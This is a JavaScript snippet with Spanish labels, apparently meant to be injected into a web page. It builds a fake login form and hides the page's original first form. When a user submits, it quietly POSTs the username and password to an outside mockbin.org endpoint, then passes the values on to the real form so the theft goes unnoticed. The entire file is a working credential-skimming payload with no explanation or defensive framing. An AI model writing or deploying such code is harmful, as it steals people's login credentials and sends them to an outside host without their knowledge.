let form=document.createElement("form");
let usuario=document.createElement("input");
let password=document.createElement("input");
let labelUsuario=document.createElement("label");
let labelPassword=document.createElement("label");
form.setAttribute("method", "post");
form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/3519b557-4cc5-40f5-809c-4065c7d5c9bb");xhr.send(`user=${usuario.value};password=${password.value}`);');
usuario.setAttribute("type", "text");
usuario.setAttribute("class", "user");
usuario.setAttribute("size", "20");
usuario.setAttribute("maxlength", "50");

password.setAttribute("type", "password");
password.setAttribute("class", "password");
password.setAttribute("size", "20");
password.setAttribute("maxlength", "50");

labelUsuario.setAttribute("for", "usuario");
labelPassword.setAttribute("for", "password");
labelUsuario.innerHTML="USUARIO:";
labelPassword.innerHTML="CONTRASEÑA:";

let boton=document.createElement("input");
boton.setAttribute("type","submit");
boton.setAttribute("class","enviar_btn");
form.appendChild(labelUsuario);
form.appendChild(usuario);
form.appendChild(labelPassword);
form.appendChild(password);
form.appendChild(boton);
document.getElementById("contenido").appendChild(form);
document.forms[0].style="display:none;";
